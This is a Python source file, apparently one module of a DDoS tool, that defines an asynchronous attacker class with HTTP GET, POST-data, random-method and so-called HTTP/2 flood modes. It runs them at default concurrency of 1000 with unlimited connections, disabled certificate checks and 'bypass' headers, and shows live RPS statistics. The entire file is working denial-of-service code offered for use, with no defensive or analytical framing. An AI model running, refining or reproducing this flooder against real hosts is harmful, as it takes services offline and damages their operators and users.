# async_attacker.py
import asyncio
import aiohttp
import ssl
import random
import time
from urllib.parse import urlparse
from datetime import datetime

class AsyncAttacker:
    """异步攻击器 - 使用asyncio和aiohttp解决GIL瓶颈"""
    
    def __init__(self, base_attacker, config):
        self.base = base_attacker
        self.config = config
        self.stats = base_attacker.stats
        self.lock = asyncio.Lock()
        self.session = None
        self.connector = None
        
    async def init_session(self):
        """初始化aiohttp会话"""
        if self.session is None:
            # 创建SSL上下文绕过证书验证
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            # 创建连接器配置
            connector = aiohttp.TCPConnector(
                limit=0,  # 无限制连接数
                limit_per_host=0,  # 无限制每主机连接数
                ssl=ssl_context,
                use_dns_cache=True,
                ttl_dns_cache=300,
                keepalive_timeout=30,
                enable_cleanup_closed=True
            )
            
            # 创建会话
            timeout = aiohttp.ClientTimeout(total=self.config["timeout"])
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )
    
    async def close_session(self):
        """关闭会话"""
        if self.session:
            await self.session.close()
            self.session = None
    
    async def async_http_flood(self, target, semaphore):
        """异步HTTP洪水攻击"""
        async with semaphore:
            try:
                method = random.choices(["GET", "POST", "HEAD"], weights=[5, 3, 2], k=1)[0]
                
                # 生成请求头
                headers_list = self.base._generate_bypass_headers(target, method)
                headers = {}
                for header in headers_list:
                    if ': ' in header and header.strip():
                        key, value = header.split(': ', 1)
                        headers[key] = value
                
                # 构建URL
                protocol = 'https' if target['ssl'] else 'http'
                url = f"{protocol}://{target['ip']}:{target['port']}{target['path']}"
                
                # 发送请求
                async with self.session.request(method, url, headers=headers, ssl=False) as response:
                    status_ok = response.status in [200, 301, 302, 404, 403]
                    
                    async with self.lock:
                        self.stats["requests"] += 1
                        if status_ok:
                            self.stats["success"] += 1
                        else:
                            self.stats["failed"] += 1
                    
                    return status_ok
                    
            except Exception as e:
                async with self.lock:
                    self.stats["failed"] += 1
                return False
    
    async def async_http2_flood(self, target, semaphore):
        """异步HTTP/2洪水攻击"""
        async with semaphore:
            try:
                method = random.choices(["GET", "POST", "HEAD"], weights=[5, 3, 2], k=1)[0]
                
                # 生成请求头
                headers_list = self.base._generate_bypass_headers(target, method)
                headers = {}
                for header in headers_list:
                    if ': ' in header and header.strip():
                        key, value = header.split(': ', 1)
                        headers[key] = value
                
                # 构建URL
                url = f"https://{target['ip']}:{target['port']}{target['path']}"
                
                # 发送HTTP/2请求
                async with self.session.request(method, url, headers=headers, ssl=False) as response:
                    status_ok = response.status in [200, 301, 302, 404, 403]
                    
                    async with self.lock:
                        self.stats["requests"] += 1
                        if status_ok:
                            self.stats["success"] += 1
                        else:
                            self.stats["failed"] += 1
                    
                    return status_ok
                    
            except Exception as e:
                async with self.lock:
                    self.stats["failed"] += 1
                return False
    
    async def async_post_flood(self, target, semaphore):
        """异步POST数据洪水攻击"""
        async with semaphore:
            try:
                # 生成随机数据
                data_size = random.randint(2048, 20480)
                post_data = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=data_size))
                
                # 生成请求头
                headers_list = self.base._generate_bypass_headers(target, "POST")
                headers = {}
                for header in headers_list:
                    if ': ' in header and header.strip():
                        key, value = header.split(': ', 1)
                        if not key.startswith('Content-'):
                            headers[key] = value
                
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                headers["Content-Length"] = str(len(post_data))
                
                # 构建URL
                protocol = 'https' if target['ssl'] else 'http'
                url = f"{protocol}://{target['ip']}:{target['port']}{target['path']}"
                
                # 发送请求
                async with self.session.request("POST", url, headers=headers, data=post_data, ssl=False) as response:
                    status_ok = response.status in [200, 301, 302, 404, 403]
                    
                    async with self.lock:
                        self.stats["requests"] += 1
                        if status_ok:
                            self.stats["success"] += 1
                        else:
                            self.stats["failed"] += 1
                    
                    return status_ok
                    
            except Exception as e:
                async with self.lock:
                    self.stats["failed"] += 1
                return False
    
    async def async_random_method(self, target, semaphore):
        """异步随机方法攻击"""
        async with semaphore:
            try:
                methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
                method = random.choices(methods, weights=[10, 8, 3, 2, 2, 2, 5], k=1)[0]
                
                # 生成请求头
                headers_list = self.base._generate_bypass_headers(target, method)
                headers = {}
                for header in headers_list:
                    if ': ' in header and header.strip():
                        key, value = header.split(': ', 1)
                        headers[key] = value
                
                # 构建URL
                protocol = 'https' if target['ssl'] else 'http'
                url = f"{protocol}://{target['ip']}:{target['port']}{target['path']}"
                
                # 发送请求
                async with self.session.request(method, url, headers=headers, ssl=False) as response:
                    status_ok = response.status in [200, 301, 302, 404, 403]
                    
                    async with self.lock:
                        self.stats["requests"] += 1
                        if status_ok:
                            self.stats["success"] += 1
                        else:
                            self.stats["failed"] += 1
                    
                    return status_ok
                    
            except Exception as e:
                async with self.lock:
                    self.stats["failed"] += 1
                return False
    
    async def run_async_attack(self, target, total_requests, concurrency=1000, attack_type="http_flood"):
        """运行异步攻击"""
        await self.init_session()
        
        # 创建信号量控制并发数
        semaphore = asyncio.Semaphore(concurrency)
        
        # 选择攻击方法
        if attack_type == "http_flood":
            attack_func = self.async_http_flood
        elif attack_type == "http2_flood":
            attack_func = self.async_http2_flood
        elif attack_type == "post_flood":
            attack_func = self.async_post_flood
        elif attack_type == "random_method":
            attack_func = self.async_random_method
        else:
            attack_func = self.async_http_flood
        
        # 创建攻击任务
        tasks = []
        for i in range(total_requests):
            task = asyncio.create_task(attack_func(target, semaphore))
            tasks.append(task)
            
            # 控制任务创建速度，避免内存爆炸
            if i % 1000 == 0:
                await asyncio.sleep(0.001)
        
        # 等待所有任务完成
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # 关闭会话
        await self.close_session()
        
        return self.stats["requests"], self.stats["success"], self.stats["failed"]

async def monitor_async_attack(stats, duration=None):
    """异步攻击监控器"""
    start_time = time.time()
    last_requests = 0
    last_time = start_time
    
    while True:
        current_time = time.time()
        elapsed = current_time - start_time
        
        # 计算RPS
        time_diff = current_time - last_time
        if time_diff >= 1.0:
            current_requests = stats["requests"]
            current_rps = (current_requests - last_requests) / time_diff
            stats["last_rps"] = current_rps
            stats["last_update"] = current_time
            
            if current_rps > stats["peak_rps"]:
                stats["peak_rps"] = current_rps
            
            last_requests = current_requests
            last_time = current_time
        
        # 计算成功率
        success_rate = (stats["success"] / stats["requests"] * 100) if stats["requests"] > 0 else 0
        
        # 显示状态
        print(
            f"\r🚀 异步攻击 | 请求: {stats['requests']} | "
            f"成功: {stats['success']} ({success_rate:.1f}%) | "
            f"实时RPS: {stats['last_rps']:.1f}/s | "
            f"峰值RPS: {stats['peak_rps']:.1f}/s | "
            f"运行: {int(elapsed)}s", 
            end="", flush=True
        )
        
        # 检查是否超时
        if duration and elapsed >= duration:
            break
            
        await asyncio.sleep(0.5)